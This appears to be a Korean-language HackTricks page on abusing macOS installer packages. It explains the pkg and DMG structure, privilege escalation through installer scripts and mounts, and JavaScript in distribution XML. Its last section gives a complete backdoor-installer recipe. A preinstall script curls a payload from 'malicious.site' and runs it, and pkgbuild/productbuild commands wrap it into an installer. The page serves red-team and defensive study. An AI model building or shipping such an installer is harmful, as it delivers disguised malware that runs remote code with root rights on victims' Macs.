# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 기본 정보

macOS **설치 패키지**(`.pkg` 파일로도 알려짐)는 macOS에서 **소프트웨어를 배포하기 위해 사용되는 파일 형식**입니다. 이 파일들은 소프트웨어가 올바르게 설치되고 실행되는 데 필요한 모든 것을 담고 있는 **상자**와 같습니다.

패키지 파일 자체는 **대상** 컴퓨터에 설치될 **파일 및 디렉토리의 계층**을 포함하는 아카이브입니다. 또한 설치 전후에 작업을 수행하기 위한 **스크립트**를 포함할 수 있으며, 예를 들어 구성 파일을 설정하거나 소프트웨어의 이전 버전을 정리하는 작업이 있습니다.

### 계층

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **배포(xml)**: 사용자 정의(제목, 환영 텍스트…) 및 스크립트/설치 확인
- **PackageInfo(xml)**: 정보, 설치 요구 사항, 설치 위치, 실행할 스크립트 경로
- **자재 명세서(bom)**: 설치, 업데이트 또는 제거할 파일 목록과 파일 권한
- **페이로드(CPIO 아카이브 gzip 압축)**: PackageInfo에서 `install-location`에 설치할 파일
- **스크립트(CPIO 아카이브 gzip 압축)**: 설치 전후 스크립트 및 실행을 위해 임시 디렉토리에 추출된 추가 리소스.

### 압축 해제
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
설치 프로그램의 내용을 수동으로 압축 해제하지 않고 시각화하려면 무료 도구 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)를 사용할 수 있습니다.

## DMG 기본 정보

DMG 파일, 또는 Apple Disk Images는 Apple의 macOS에서 디스크 이미지를 위해 사용되는 파일 형식입니다. DMG 파일은 본질적으로 **마운트 가능한 디스크 이미지**(자체 파일 시스템을 포함)로, 일반적으로 압축되고 때때로 암호화된 원시 블록 데이터를 포함합니다. DMG 파일을 열면 macOS가 **물리적 디스크처럼 마운트**하여 그 내용을 접근할 수 있게 합니다.

> [!CAUTION]
> **`.dmg`** 설치 프로그램은 **매우 많은 형식**을 지원하므로, 과거에 취약점을 포함한 일부가 **커널 코드 실행**을 얻기 위해 악용되었습니다.

### 계층 구조

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 파일의 계층 구조는 내용에 따라 다를 수 있습니다. 그러나 애플리케이션 DMG의 경우 일반적으로 다음 구조를 따릅니다:

- 최상위: 디스크 이미지의 루트입니다. 일반적으로 애플리케이션과 애플리케이션 폴더에 대한 링크를 포함합니다.
- 애플리케이션 (.app): 실제 애플리케이션입니다. macOS에서 애플리케이션은 일반적으로 애플리케이션을 구성하는 여러 개별 파일과 폴더를 포함하는 패키지입니다.
- 애플리케이션 링크: macOS의 애플리케이션 폴더에 대한 바로 가기입니다. 이는 애플리케이션 설치를 쉽게 하기 위한 것입니다. .app 파일을 이 바로 가기로 드래그하여 앱을 설치할 수 있습니다.

## pkg 악용을 통한 권한 상승

### 공개 디렉토리에서의 실행

예를 들어, 설치 전 또는 후 스크립트가 **`/var/tmp/Installerutil`**에서 실행되고, 공격자가 해당 스크립트를 제어할 수 있다면, 스크립트가 실행될 때마다 권한을 상승시킬 수 있습니다. 또는 또 다른 유사한 예:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

이것은 여러 설치 프로그램과 업데이트 프로그램이 **루트로 무언가를 실행하기 위해 호출하는 [공개 함수](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)**입니다. 이 함수는 **실행할 파일의 경로**를 매개변수로 받아들이지만, 공격자가 이 파일을 **수정**할 수 있다면, 루트로 실행을 **악용**하여 **권한을 상승**시킬 수 있습니다.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
더 많은 정보는 이 강의를 확인하세요: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### 마운트를 통한 실행

설치 프로그램이 `/tmp/fixedname/bla/bla`에 쓸 경우, **소유자가 없는** `/tmp/fixedname` 위에 **마운트를 생성**하여 설치 과정 중에 **어떤 파일도 수정**할 수 있습니다.

이의 예로 **CVE-2021-26089**가 있으며, 이는 **주기적인 스크립트**를 **루트 권한으로 실행**하기 위해 덮어쓰는 데 성공했습니다. 더 많은 정보는 이 강의를 확인하세요: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg를 악성 소프트웨어로 사용하기

### 빈 페이로드

실제 페이로드 없이 **스크립트 전후 설치**를 포함한 **`.pkg`** 파일을 생성하는 것이 가능합니다.

### 배포 xml의 JS

패키지의 **배포 xml** 파일에 **`<script>`** 태그를 추가할 수 있으며, 해당 코드는 실행되어 **`system.run`**을 사용하여 **명령을 실행**할 수 있습니다:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### 백도어 설치 프로그램

dist.xml 내부에 스크립트와 JS 코드를 사용하는 악성 설치 프로그램
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## 참고 문헌

- [**DEF CON 27 - 패키지 압축 해제: macOS 설치 패키지 및 일반 보안 결함 내부 살펴보기**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "macOS 설치 프로그램의 야생 세계" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - 패키지 압축 해제: macOS 설치 패키지 내부 살펴보기**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
